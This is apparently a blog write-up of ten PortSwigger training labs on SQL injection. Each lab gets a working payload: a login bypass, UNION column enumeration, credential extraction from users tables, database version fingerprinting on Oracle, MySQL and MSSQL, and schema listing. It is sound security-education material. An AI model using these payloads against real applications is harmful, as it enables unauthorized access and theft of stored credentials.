---
title: Portswigger Lab SQLi (UNION)
date: 2023-01-28 09:45:47 +07:00
modified: 2023-01-28 09:45:47 +07:00
tags: [Portswigger, SQLi , Writeup]
description: Write Up for Portswigger Lab SQLi
---


![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/logo.png)

Lab Name → **SQL Injection (UNION)**

Lab Link → [https://portswigger.net/web-security/all-labs](https://portswigger.net/web-security/all-labs)

Description → First 10 Labs of SQLi Lab based on UNION attack.

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

By making the statement true we can get all the categories.

Payload → `'OR 1=1-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/1.png)


## SQL injection vulnerability allowing login bypass

In the login page after typing the username we can just comment the rest of the statement. Which will make the password parameter a comment.

Payload → `administrator'-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/2.png)


## SQL injection UNION attack, determining the number of columns returned by the query

First we have to find how many columns are there. We can use the [ORDER BY]() keyword. Lets increase the payload number by 1 until we get an error.

Payload → `'ORDER BY 3--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/3.png)

When we reach 4 we get a error.

Payload → `'ORDER BY 4--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/4.png)

Now we know that there are 3 columns. Lets use UNION to get all the columns.

Payload → `' UNION SELECT NULL,NULL,NULL--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/5.png)


## SQL injection UNION attack, finding a column containing text

Now that we know which table has 3 columns, we have to find the column that is injectable. In this case, 2nd column was injectable.

Payload → `' UNION SELECT NULL,'ap8kCb',NULL--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/6.png)


## SQL injection UNION attack, retrieving data from other tables

We go back to find the number of the column. In this case, we get an error at 3. So, the number of the column is 2.

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/7.png)

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/8.png)

Next, we get the username and password from the user's table using UNION.

Payload → `' UNION SELECT username,password FROM users--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/9.png)

We get the admin name and password. After we log in, the lab is solved.

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/10.png)


## SQL injection UNION attack, retrieving multiple values in a single column

We can use the CONCAT keyword to get information in one column.

Payload → `' UNION SELECT NULL,CONCAT(username,' ',password) FROM users--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/11.png)



## SQL injection attack, querying the database type and version on Oracle

For Oracle database we can get [banner]() from [v$version]() table to get version information.

Payload → `' UNION SELECT banner,NULL FROM v$version--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/12.png)



## SQL injection attack, querying the database type and version on MySQL and Microsoft

To get MySQL or Microsoft database version we can use [@@version]() keyword.

Payload → `' UNION SELECT @@version,NULL-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/13.png)

## SQL injection attack, listing the database contents on non-Oracle databases

First we have to find the table_name from [information_schema.tables]()


Payload → `' UNION SELECT table_name,NULL FROM information_schema.tables--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/14.png)

We found the table of the user. Next, we are going to get the column names from the table.

Payload → `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_neqdue'--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/15.png)

After getting the column names we can print out the data and after logging in with the administrator we solve the lab.

Payload → `' UNION SELECT username_skjbtp,password_ajvmno FROM users_neqdue--`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/16.png)


## SQL injection attack, listing the database contents on Oracle

Lets get the table name first.

Payload → `' UNION SELECT table_name,NULL FROM all_tables-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/17.png)

Now that we have the table name lets get the column names from that table.

Payload → `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ETYIRN'-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/18.png)

Now lets get Admin username and password from the columns.

Payload → `' UNION SELECT USERNAME_EPLQOW,PASSWORD_ZXLHQB FROM USERS_ETYIRN-- -`

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/19.png)

![](https://photos.squarezero.dev/file/abir-images/Portswigger/SQLiUnion/20.png)


